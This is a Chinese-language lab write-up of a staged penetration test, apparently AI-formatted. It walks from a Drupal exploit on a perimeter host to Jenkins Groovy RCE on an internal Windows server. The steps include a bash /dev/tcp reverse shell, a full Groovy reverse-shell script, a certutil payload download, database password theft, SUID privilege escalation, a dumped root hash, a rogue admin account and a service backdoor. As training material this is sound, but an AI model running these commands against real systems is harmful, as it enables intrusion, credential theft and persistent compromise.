------

## 项目简介

A集团是一家在科技行业中占据重要地位的公司，拥有庞大的外部资产和复杂的内部网络。为了应对日益严峻的网络安全威胁以及遵守国家的网络安全保护要求，集团决定开展一次全面的安全评估。
 经过严格筛选，A集团决定聘请某安全团队，你做为团队领队，需要合理的分配任务，让团队内的成员合作完成本次安全评估工作。

------

### 边界网络渗透测试

#### ◇ 具体要求：

1.具体要求如下：
 2.团队成员为了更好的完成渗透测试任务，需要先对边界机器进行端口扫描和服务发现，请你根据任务要求完成扫描任务并将相关扫描结果进行截图并进行文字说明。

**[1] 主机发现**

![](/images/1-1.png)

 目标机器IP 为 172.16.12.20

**[2] 端口与服务探测**

![](/images/1-2.png)

 主要是80端口，web

3.团队成员需对扫描结果进行分析，你需要从相关服务中发现漏洞，请你想发现漏洞的过程进行截图并进行文字说明。

**[1] WEB**

![](/images/1-3.png)

**[2] MSF上SearchSploit Drupal这个系统，找到合适的漏洞**

![](/images/1-4.png)

4.安全团队成功在边界机器上getshell，请你将漏洞利用过程中关键步骤进行截图并进行文字说明。
 设置参数漏洞利用 getshell

![](/images/1-5.png)

5.团队成员为了更好的管理shell信息，在边界机器上传了webshell，请你将上传webshell并使用蚁剑连接的关键步骤进行截图并进行文字说明。

**[1] 制作哥斯拉webshell**

![](/images/1-6.png)

 **[2] 向根目录上传**

![](/images/1-7.png)

 **[3] 连接测试，webshell页面**

![](/images/1-8.png)

6.团队成员为了更好的管理shell信息，在边界机器执行了bash 反弹shell的操作，请你将反弹shell的关键步骤进行截图并进行文字说明。

**[1] Kali监听**

![](/images/1-9.png)

 **[2] 一句话反弹**

```bash
bash -c 'exec 5<>/dev/tcp/172.16.12.23/1032; cat <&5 | while read line; do $line 2>&5 >&5; done'
```

![](/images/1-10.png)

**[3] 方便操作，直接上C2——wget+nohup执行**

![](/images/1-11.png)

![](/images/1-12.png)

7.团队成员需要查看目标系统数据库相关信息，你需要连接到目标数据库，并查看数据库中敏感信息表(用户表)，请你将以上关键步骤进行截图并进行文字说明。

**[1] 找到数据库密码 - /var/www/sites/default/settings.php**

![](/images/1-13.png)

![](/images/1-14.png)

**[2] 登录数据库**

```bash
mysql -u dbuser -p
R0ck3t
```

![](/images/1-15.png)

**[3] 查询**

```sql
show databases;
use drupaldb;
show tables;
select name,pass from user;
```

![](/images/1-16.png)

8.团队需要对目标深入控制，需要将权限提升为超级用户，请你将提权过程进行截图并进行文字说明。

**[1] Suid find**

```bash
find / -perm -4000 -type f 2>/dev/null
```

**[2] Find提权**

```bash
find ./ acce -exec '/bin/sh' \;
```

![](/images/1-17.png)

9.安全团队为了向A集团证明安全风险，需要提取系统root用户的hash信息，请你将关键步骤进行截图并进行文字说明。

```bash
cat /etc/shadow
```

![](/images/1-18.png)

```
root:$6$9N.2og0p$wcx31FyKb9mGjhn45UUJHPLmAqkz0VVTSiDCvMxEkef5mk6GzCucVedfkfCIaSEjCK1LKqcOD.Dd1FsDw7C8R.:19921:0:99999:7:::
```

------

### ✔ 场景二：代理隧道和端口转发配置

#### ◇ 具体要求：

1.安全团队在进入内网之前需要先判断网络环境，请你在边界机器上查看网卡、arp、路由信息，请你将具体操作过程进行截图并进行文字说明。

**[1] 网卡**

```bash
ip addr show
```

![](/images/2-1.png)

**[2] Arp**

```bash
ip neigh
```

![](/images/2-2.png)

**[3] 路由**

```bash
ip route
```

![](/images/2-3.png)

2.安全团队决定在边界机器上搭建socks5代理，并将代理端口开放在kali机器的1080端口。
 直接打gost

![](/images/2-4.png)

![](/images/2-5.png)

3.安全团队为了更好的接受反弹的shell信息，需要在kali中监听4444端口，然后将4444端口转发到边界机器上5555端口，请你将具体操作过程进行截图并进行文字说明。

```bash
ssh 远程端口转发
ssh -R 5555:localhost:4444 kali@172.16.12.23
```

![](/images/2-6.png)

4.安全团队为了更好的控制内网中的机器，决定利用 MSF生成反弹的shell文件，并结合问题三生成一个shell。请你将关键步骤进行截图并进行文字说明。
 反弹的Shell
 X86 elf反连

![](/images/2-7.png)

5.安全团队为了更好的连接内网中的机器，决定将内网机器的3389端口转发到kali的1081端口，请你将关键步骤进行截图并进行文字说明。

依旧远程转发

```bash
ssh -R 1081:localhost:3389 kali@172.16.12.23
```

![](/images/2-8.png)

------

### ✔ 场景三：内网渗透测试

#### ◇ 具体要求：

1.安全团队在测试内部网络的过程中，需要发现内网中所有电脑，请你将主机存活探测中关键步骤进行截图并进行文字说明。
 扫描内网网段

![](/images/3-1.png)

 发现主机 172.16.13.10

2.安全团队为了高效完成测试任务，需要对内网中存活主机进行端口扫描和服务发现，请你根据要求完成扫描任务，并在关键步骤中进行截图并进行文字说明。

依旧fscan，扫描结果如下

```
(icmp) Target 172.16.13.20    is alive
(icmp) Target 172.16.13.10    is alive
[*] Icmp alive hosts len is: 2
172.16.13.10:8080 open
172.16.13.10:9200 open
172.16.13.10:3306 open
172.16.13.10:445 open
172.16.13.10:139 open
172.16.13.10:135 open
172.16.13.10:80 open
172.16.13.20:80 open
172.16.13.20:22 open
172.16.13.10:21 open
172.16.13.10:8028 open
172.16.13.10:8484 open
172.16.13.10:8443 open
172.16.13.10:8181 open
[*] alive ports len is: 14
start vulscan
[*] NetInfo 
[*]172.16.13.10
   [->]Target-B
   [->]172.16.13.10
[+] MS17-010 172.16.13.10       (Windows Server 2008 R2 Standard 7601 Service Pack 1)
[*] WebTitle http://172.16.13.10:9200  code:200 len:307    title:None
[*] WebTitle http://172.16.13.20       code:200 len:7585   title:Welcome to Drupal Site | Drupal Site
[*] NetBios 172.16.13.10    WORKGROUP\Target-B                  Windows Server 2008 R2 Standard 7601 Service Pack 1
[*] WebTitle http://172.16.13.10       code:200 len:1116928 title:None
[*] WebTitle http://172.16.13.10:8080  code:200 len:4626   title:GlassFish Server - Server Running
[*] WebTitle https://172.16.13.10:8181 code:200 len:4626   title:GlassFish Server - Server Running
[*] WebTitle http://172.16.13.10:8484  code:200 len:11497  title:Dashboard [Jenkins]
[+] PocScan http://172.16.13.10:9200 poc-yaml-elasticsearch-unauth 
[+] InfoScan http://172.16.13.10:8484  [Jenkins] 
[+] PocScan http://172.16.13.20 poc-yaml-drupal-cve-2014-3704-sqli 
[+] mysql 172.16.13.10:3306:root
```

3.安全团队根据扫描结果成功利用某漏洞getshell，请你将漏洞发现和漏洞利用中关键步骤进行截图并进行文字说明。

**[1] Burp配置socks5**

![](/images/3-2.png)

 **[2] 访问到内网Jenkins**
 [http://172.16.13.10:8484](http://172.16.13.10:8484/)

![](/images/3-3.png)

**[3] 进入到系统管理->脚本命令行可RCE**

```groovy
println "whoami".execute().text
```

![](/images/3-4.png)

**[4] 入口机监听**

![](/images/3-5.png)

 **[5] Groovy上线**

![](/images/3-6.png)

```groovy
String host = "172.16.13.20";
int port = 13333;
String cmd = "cmd.exe";

Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host, port);

InputStream pi = p.getInputStream(),
           pe = p.getErrorStream(), 
           si = s.getInputStream();
           
OutputStream po = p.getOutputStream(),
            so = s.getOutputStream();

while (!s.isClosed()) {
    while (pi.available() > 0) 
        so.write(pi.read());
        
    while (pe.available() > 0) 
        so.write(pe.read());
    
    while (si.available() > 0) 
        po.write(si.read());
    
    so.flush();
    po.flush();
    
    Thread.sleep(50);
    
    try {
        p.exitValue();
        break;
    } catch (Exception e) {}
}

p.destroy();
s.close();
```

**[6] Getshell**

![](/images/3-7.png)

 **[7] 做正向连接从socks5上线**

![](/images/3-8.png)

上传木马到web根目录

![](/images/3-9.png)

certutil 下载：

```cmd
certutil -urlcache -split -f http://172.16.13.20/pppp.exe 2.exe
```

![](/images/3-10.png)

上线C2

![](/images/3-11.png)

4.安全团队为了向A集团证明安全风险，需要将一个文本文件上传到内网靶机，上传路径为”C:\”,文本内容为：”2025 HQDX YYDS”；请你利用MSF上传该文件，上传成功后进行查看，请你将关键步骤截图并进行文字说明。

 **[1] 上传getsystem工具**

sit.exe -a whoami

![](/images/3-12.png)

 **[2] 在C盘以system权限创建文件**

![](/images/3-13.png)

 **[3] 成功创建**

![](/images/3-14.png)

![](/images/3-15.png)

5.安全团队更好的控制靶机，决定利用MSF生成反弹shell文件，并上传到内网靶机中进行执行…
 依旧Shell上线C2

![](/images/3-16.png)

6.安全团队为了更好的控制靶机，决定新建一个名为”hd2025”的用户，并加入到管理组中，完成后结合场景三中的要求5，在 kali上使用新建用户进行远程桌面登录，请你将关键步骤截图并进行文字说明。

高权限执行命令

```cmd
net user hd2025 admin!@#45 /add
net localgroup Administrators hd2025 /add
```

验证

```
net user
```

![](/images/3-17.png)

```
net localgroup Administrators
```

![](/images/3-18.png)

7.安全团队为了持久化控制内网机器，决定使用”服务开机自启”后门，结合场景三中的要求3和要求4，接受自启动反弹回来的shell，请你将关键步骤截图并进行文字说明。

 **[1] Proxifier**

![](/images/3-19.png)

 **[2] Mstsc**

![](/images/3-20.png)

 **[3] Rdp**

![](/images/3-21.png)

 **[4] 创建服务**

```cmd
sc create JenkinsBack binPath= "C:\Users\hd2025\Desktop\fff.exe" start= auto DisplayName= "Jenkinsfuck"
sc start JenkinsBack
```

![](/images/3-22.png)

![](/images/3-23.png)

重启得到 administrator权限shell

![](/images/3-24.png)

至此渗透测试完结

------

## 团队成员及任务分配

**赵天亿（渗透测试专家）：**
 1.任务：总体协调和管理，确保所有任务按计划进行。
 2.职责：外围资产信息收集，文档管理与队伍协调。

**吴圳宇（渗透测试专家）：**
 1.任务：外部资产调查与渗透测试。
 2.职责：对公网linux入口机器进行web漏洞利用，突破边界。

**宁国荣（渗透测试专家）：**
 1.任务：内网提权与主机发现。
 2.职责：对公网linux入口机器进行提权并进行内网网段信息收集。

**王汉英（渗透测试专家）：**
 1.任务：内网隧道搭建与端口转发测试。
 2.职责：代理内网流量出公网，方便深层的渗透测试进行。

**马家骏（红队攻防研究员）：**
 1.任务：内网横向提权与后门持久化。
 2.职责：横向利用内网web漏洞获取不出网的Windows主机权限，并进行bypassUAC提权与用户、服务后门的添加。

------

## 实验总结

### 阐述渗透测试过程：

#### 1. 外网入口与初始控制权获取

在对目标外网主机进行信息收集与端口扫描后，发现其暴露了 Web 服务，识别为 Drupal 内容管理系统。通过漏洞情报检索发现，该版本存在已公开的一键 Getshell 高危漏洞。利用该漏洞成功执行命令注入，获得 Webshell 权限，并通过反弹连接获取到目标主机的反向 shell。

为了方便后续操作，成功将该主机上线至 VShell 控制台，并部署了哥斯拉 PHP Webshell 实现双通道控制，作为初步维权手段。同时在 Web 目录下查找到数据库连接配置文件，从中提取出 MySQL 数据库密码并成功连接数据库，获取到包含用户信息和业务数据在内的大量敏感内容。

进一步在目标系统中查找提权条件，发现存在具有提权潜力的 SUID 可执行文件。利用本地提权工具对该文件进行利用，最终获取 root 权限，并成功提取 root 用户的 Hash，用于证明控制权限已到达最高级别。

#### 2. 隧道搭建与内网渗透起点构建

为了进一步向内网渗透，通过对外网主机部署端口转发与 Socks5 隧道，将其作为中转节点，构建稳定的进入内网的通路。在具备稳定访问内网的能力后，开始对内网进行信息探测与横向扫描。

使用内网扫描工具对内网网段进行探测，发现多个存活的 Windows 主机，并识别出其中一台主机运行了未授权访问的 Jenkins 服务。由于该主机不具备直接出网能力，采用 Jenkins 命令执行功能，执行命令将 shell 反弹回入口机，从而实现与内网 Windows 机器的交互控制。

#### 3. 横向控制与持久化维权

成功上线 Windows 内网主机后，通过正向 Socks5 隧道对其进行进一步渗透与利用。由于该内网主机同样无法出网，为实现文件传输，利用 Windows 自带的 certutil 工具，从入口主机 Web 服务下载相关工具。

上传并运行自编写的 Windows 提权工具，在目标系统上实现了向 C 盘写入文件的能力，并进一步将当前用户添加至管理员组，获得系统管理权限。随后，通过开启 RDP 并转发 3389 端口至控制端，实现图形化远程桌面访问。

为确保控制持久化，在系统中创建自启动服务，部署后门程序，模拟系统服务名称，伪装为正常进程运行。经重启测试后，该服务自动运行并成功回连控制端，表明维权手段生效，控制链条完整稳定。

------

如果你还需要把所有内容合并成一个完整 Markdown 文档，我也可以帮你整理！
